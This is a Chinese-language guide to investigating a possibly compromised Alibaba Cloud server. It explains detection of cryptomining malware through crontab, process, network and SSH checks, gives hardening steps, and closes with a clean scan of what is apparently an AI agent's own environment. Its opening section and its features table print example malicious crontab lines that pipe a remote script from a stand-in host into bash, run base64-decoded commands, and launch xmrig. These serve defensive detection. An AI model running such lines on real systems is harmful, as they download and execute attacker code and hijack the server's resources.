# 阿里云服务器入侵排查指南：crontab 可疑加密命令

## 一、背景说明

crontab 中出现 base64 加密命令、下载并执行远程脚本等行为，是**典型的挖矿病毒 / 木马入侵特征**。常见形式如：

```bash
# 典型挖矿病毒 crontab 示例
*/5 * * * * curl -fsSL http://malicious-site.com/setup.sh | bash
*/10 * * * * (curl -fsSL http://xxx.xxx/a.sh||wget -q -O- http://xxx.xxx/a.sh)|bash
* * * * * /tmp/.hidden/xmrig -o pool.minexmr.com:443 -u WALLET
0 */1 * * * echo "BASE64加密内容" | base64 -d | bash
```

> **是否被入侵？** 如果你在 crontab 中看到了 base64 编码、curl/wget 下载远程脚本、或者看不懂的二进制路径，**大概率已经被入侵**。

---

## 二、完整排查步骤

### 2.1 检查所有用户的 crontab

```bash
# 查看当前用户的 crontab
crontab -l

# 查看 root 用户的 crontab
sudo crontab -l

# 遍历所有用户的 crontab
for user in $(cut -f1 -d: /etc/passwd); do
  crontab_output=$(crontab -u "$user" -l 2>/dev/null)
  if [ -n "$crontab_output" ]; then
    echo "=== $user ==="
    echo "$crontab_output"
  fi
done
```

### 2.2 检查系统级 cron 配置

```bash
# 检查系统 crontab
cat /etc/crontab

# 检查 cron 子目录
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# 查看每个文件的内容
for f in /etc/cron.d/*; do
  echo "--- $f ---"
  cat "$f"
done

# 检查 cron spool（有些病毒藏在这里）
ls -la /var/spool/cron/
ls -la /var/spool/cron/crontabs/
```

### 2.3 解码可疑的 base64 内容

如果发现 crontab 中有 base64 加密内容，先解码看看是什么：

```bash
# 将加密内容复制出来解码（不要执行！）
echo "这里粘贴base64内容" | base64 -d

# 如果是多层加密，可能需要多次解码
echo "内容" | base64 -d | base64 -d
```

### 2.4 检查可疑进程

```bash
# 按 CPU 占用排序（挖矿病毒通常 CPU 占用极高）
ps aux --sort=-%cpu | head -20
top -bn1 | head -20

# 搜索常见挖矿进程名
ps aux | grep -iE 'xmrig|kworkerds|crypto|miner|kdevtmpfs|kinsing|xmr|monero|stratum|minergate|pool\.'

# 查看进程树，发现异常父子关系
pstree -ap

# 检查被删除但仍在运行的文件（常见隐藏手法）
ls -la /proc/*/exe 2>/dev/null | grep '(deleted)'
```

### 2.5 检查网络连接

```bash
# 查看所有监听端口
ss -tlnp
netstat -tlnp

# 查看所有对外连接（重点关注矿池端口如 3333, 4444, 5555, 8888, 14444, 45700 等）
ss -tnp | grep -E ':3333|:4444|:5555|:8888|:14444|:45700'

# 查看所有活跃连接
ss -tnp

# DNS 查询记录（部分病毒通过 DNS 通信）
cat /var/log/syslog | grep -i "dns" | tail -50
```

### 2.6 检查可疑文件

```bash
# 检查常见病毒藏匿路径
ls -la /tmp/
ls -la /var/tmp/
ls -la /dev/shm/
ls -la /tmp/.* 2>/dev/null
ls -la /root/.* 2>/dev/null

# 查找 /tmp 下的可执行文件（正常情况不应有太多）
find /tmp -type f -executable
find /var/tmp -type f -executable
find /dev/shm -type f

# 查找最近 3 天内被修改的文件
find / -mtime -3 -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | head -50

# 查找隐藏目录（以 . 开头）
find /tmp /var/tmp /dev/shm -name ".*" -type d 2>/dev/null
```

### 2.7 检查用户和 SSH

```bash
# 有 shell 的用户
grep -v '/nologin\|/false' /etc/passwd

# 检查 authorized_keys（是否被植入后门公钥）
cat /root/.ssh/authorized_keys
cat /home/*/.ssh/authorized_keys

# 检查最近登录
last -20
lastb -20   # 失败的登录

# 检查 SSH 配置是否被篡改
cat /etc/ssh/sshd_config | grep -E 'PermitRootLogin|PasswordAuthentication|AuthorizedKeysFile'
```

### 2.8 检查系统服务和启动项

```bash
# 检查 systemd 定时器
systemctl list-timers --all

# 检查运行中的服务
systemctl list-units --type=service --state=running

# 检查最近修改的服务文件
find /etc/systemd/system /usr/lib/systemd/system -name "*.service" -mtime -30

# 检查 rc.local
cat /etc/rc.local

# 检查 LD_PRELOAD 劫持（高级持久化手法）
echo $LD_PRELOAD
cat /etc/ld.so.preload

# 检查 profile 后门
tail -20 /etc/profile
tail -20 /etc/bash.bashrc
tail -20 /root/.bashrc
tail -20 /root/.bash_profile
```

### 2.9 检查日志

```bash
# 检查安全日志
cat /var/log/auth.log | grep -E 'Accepted|Failed' | tail -50

# 检查暴力破解痕迹
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -20

# 检查 cron 执行日志
grep CRON /var/log/syslog | tail -50

# 检查内核日志
dmesg | grep -i error | tail -20
```

---

## 三、常见挖矿病毒特征

| 特征 | 说明 |
|------|------|
| crontab 中有 base64 编码命令 | `echo "xxx" \| base64 -d \| bash` |
| crontab 中有 curl/wget 下载并执行 | `curl http://xxx/a.sh \| bash` |
| CPU 长期占用 90%+ | 挖矿进程大量消耗 CPU |
| 进程名伪装成系统进程 | 如 `kworkerds`、`kdevtmpfsi`、`kinsing` |
| `/tmp`、`/var/tmp`、`/dev/shm` 下有可疑文件 | 病毒喜欢藏在临时目录 |
| 有到矿池 IP/域名的外连 | 如 `pool.minexmr.com`、`xmr.pool.minergate.com` |
| `authorized_keys` 中有陌生公钥 | 攻击者植入后门 |
| `LD_PRELOAD` 被设置 | 用于隐藏进程和文件 |
| 防火墙规则被修改 | `iptables` 规则异常 |

---

## 四、处置措施

### 4.1 紧急处置

```bash
# 1. 立即清除可疑 crontab
crontab -r           # 清除当前用户
sudo crontab -r      # 清除 root

# 2. 杀掉可疑进程
kill -9 <PID>

# 3. 删除可疑文件
rm -f /tmp/.hidden_malware
rm -f /var/tmp/.cache_file

# 4. 检查并清理 authorized_keys
vim /root/.ssh/authorized_keys
vim /home/ubuntu/.ssh/authorized_keys

# 5. 清理恶意 cron 文件
rm -f /etc/cron.d/malicious_job
```

### 4.2 加固措施

```bash
# 1. 修改所有用户密码（使用强密码）
passwd root
passwd ubuntu

# 2. 禁止 root SSH 登录
sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
systemctl restart sshd

# 3. 禁止密码登录，改为密钥登录
sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart sshd

# 4. 配置防火墙
# 阿里云安全组只开放必要端口（22、80、443）
# 本机防火墙
ufw enable
ufw default deny incoming
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp

# 5. 安装并配置 fail2ban（防暴力破解）
apt install fail2ban -y
systemctl enable fail2ban
systemctl start fail2ban

# 6. 更新系统
apt update && apt upgrade -y

# 7. 锁定 crontab，只允许特定用户
echo "root" > /etc/cron.allow
chmod 600 /etc/cron.allow
```

### 4.3 阿里云平台侧操作

1. **阿里云安全中心**：登录阿里云控制台 → 云安全中心 → 查看告警事件
2. **安全组**：检查并收紧安全组规则，移除不必要的入站规则
3. **AccessKey 检查**：在 RAM 控制台检查是否有异常的 AccessKey
4. **快照备份**：立即创建磁盘快照，保留取证证据
5. **云安全中心扫描**：使用阿里云安全中心的"病毒查杀"功能全盘扫描
6. **操作审计**：查看 ActionTrail 操作审计日志，排查异常 API 调用

---

## 五、预防建议

1. **修改 SSH 默认端口**（22 → 其他端口）
2. **禁用密码登录**，仅使用密钥认证
3. **开启阿里云安全中心**（免费版也有基础防护）
4. **定期检查 crontab 和系统服务**
5. **安装 HIDS**（主机入侵检测系统），如阿里云安骑士
6. **最小权限原则**：不使用 root 运行服务
7. **及时更新补丁**：定期执行 `apt update && apt upgrade`
8. **设置系统审计**：配置 auditd 监控关键文件变更

---

## 六、本次排查结果（当前环境）

对当前工作环境（Cursor Cloud Agent）的排查结果如下：

| 检查项 | 结果 | 状态 |
|--------|------|------|
| 用户 crontab | 无可疑条目 | ✅ 正常 |
| 系统 cron 目录 | 仅有 e2scrub_all（正常）| ✅ 正常 |
| CPU 高占用进程 | 无异常（均为正常桌面/开发工具进程） | ✅ 正常 |
| 挖矿进程关键词 | 未发现 | ✅ 正常 |
| 网络连接 | 无可疑外连 | ✅ 正常 |
| 系统用户 | 仅 root 和 ubuntu（正常） | ✅ 正常 |
| SSH authorized_keys | 未发现异常公钥 | ✅ 正常 |
| 临时目录可疑文件 | 未发现 | ✅ 正常 |
| LD_PRELOAD 劫持 | 未发现 | ✅ 正常 |
| Profile 后门 | 未发现 | ✅ 正常 |
| Systemd 服务 | 无可疑服务 | ✅ 正常 |

> **结论**：当前环境（Cursor Cloud Agent）未发现入侵迹象。但如果你在**阿里云 ECS 服务器**上发现了可疑 crontab，请在那台服务器上按照以上步骤进行排查。
